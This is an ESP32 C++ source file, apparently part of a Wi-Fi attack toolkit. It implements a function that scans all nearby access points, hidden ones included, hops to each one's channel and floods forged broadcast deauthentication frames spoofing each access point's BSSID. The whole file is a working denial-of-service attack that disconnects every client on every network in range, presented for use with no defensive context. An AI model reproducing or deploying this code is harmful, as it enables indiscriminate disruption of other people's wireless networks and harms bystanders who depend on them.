#include "wifi_atks.h"
#include <WiFi.h>
#include <esp_wifi.h>
#include <esp_err.h>
#include <vector>

// ----------------------------------------------------------------------------
// Configuration constants
// ----------------------------------------------------------------------------
static constexpr int NUM_FRAMES_PER_DEAUTH = 10;
static constexpr int DEAUTH_FRAME_DELAY   = 10;   // ms between each TX
static constexpr int CHANNEL_DELAY        = 100;  // ms between channels

// ----------------------------------------------------------------------------
// Build & send a burst of broadcast deauths for one BSSID on the STA interface
// ----------------------------------------------------------------------------
static void floodBSSID(const uint8_t bssid[6], uint16_t reasonCode) {
  uint8_t frame[26] = {
    0xC0,0x00,            // Frame Control: Deauth subtype
    0x00,0x00,            // Duration
    // Destination: broadcast
    0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,
    // Source (filled below)
    0,0,0,0,0,0,
    // BSSID (filled below)
    0,0,0,0,0,0,
    0x00,0x00,            // Sequence control
    // Reason code (filled below)
    0,0
  };

  // Populate Source & BSSID
  memcpy(&frame[10], bssid, 6);
  memcpy(&frame[16], bssid, 6);
  // Populate Reason Code
  frame[24] = reasonCode & 0xFF;
  frame[25] = (reasonCode >> 8) & 0xFF;

  // Transmit the burst
  for (int i = 0; i < NUM_FRAMES_PER_DEAUTH; i++) {
    esp_err_t res = esp_wifi_80211_tx(WIFI_IF_STA, frame, sizeof(frame), false);
    if (res != ESP_OK) {
      Serial.printf("  TX err %d\n", res);
    }
    delay(DEAUTH_FRAME_DELAY);
  }
}

// ----------------------------------------------------------------------------
// Public API: scan for all APs, switch channels, and flood each
// ----------------------------------------------------------------------------
void deauthFloodAll(uint16_t reasonCode) {
  Serial.println();
  Serial.println(">>> deauthFloodAll starting");

  // 1) Put radio in AP+STA and bring up the driver
  WiFi.mode(WIFI_AP_STA);
  WiFi.softAP("FloodMode", nullptr, 1);   // dummy AP on channel 1
  WiFi.disconnect(/*eraseAPs=*/true, /*wifiOff=*/false);
  delay(100);

  // **Missing step: start the ESP-IDF Wi-Fi driver**
  {
    esp_err_t st = esp_wifi_start();
    if (st != ESP_OK) {
      Serial.printf("esp_wifi_start() failed: %d\n", st);
      return;
    }
  }

  // 2) Ensure STA interface supports 802.11 b/g/n
  esp_wifi_set_protocol(WIFI_IF_STA,
      WIFI_PROTOCOL_11B | WIFI_PROTOCOL_11G | WIFI_PROTOCOL_11N);

  // 3) Disable promiscuous (not needed for broadcast TX)
  esp_wifi_set_promiscuous(false);

  // 4) Configure and run a blocking scan (including hidden SSIDs)
  wifi_scan_config_t scanConf = {};
  scanConf.show_hidden = true;
  esp_err_t scanErr = esp_wifi_scan_start(&scanConf, /*block=*/true);
  if (scanErr != ESP_OK) {
    Serial.printf("Scan start failed: %d\n", scanErr);
    return;
  }

  // 5) Get number of APs found
  uint16_t apCount = 0;
  esp_wifi_scan_get_ap_num(&apCount);
  if (apCount == 0) {
    Serial.println("No APs found");
    return;
  }

  // 6) Retrieve AP records
  std::vector<wifi_ap_record_t> records(apCount);
  esp_wifi_scan_get_ap_records(&apCount, records.data());

  Serial.printf("Found %d APs, flooding...\n", apCount);

  // 7) Iterate and flood each AP
  for (auto &rec : records) {
    // Null-terminate SSID for printing
    char ssidBuf[33] = {0};
    memcpy(ssidBuf, rec.ssid, strnlen((char*)rec.ssid, 32));
    Serial.printf("→ %s (ch %d)\n", ssidBuf, rec.primary);

    // Switch STA iface to AP's channel
    if (esp_wifi_set_channel(rec.primary, WIFI_SECOND_CHAN_NONE) != ESP_OK) {
      Serial.printf(" ! cannot switch to ch %d\n", rec.primary);
      continue;
    }

    // Flood broadcast deauths
    floodBSSID(rec.bssid, reasonCode);
    delay(CHANNEL_DELAY);
  }

  Serial.println("<<< deauthFloodAll complete");
}
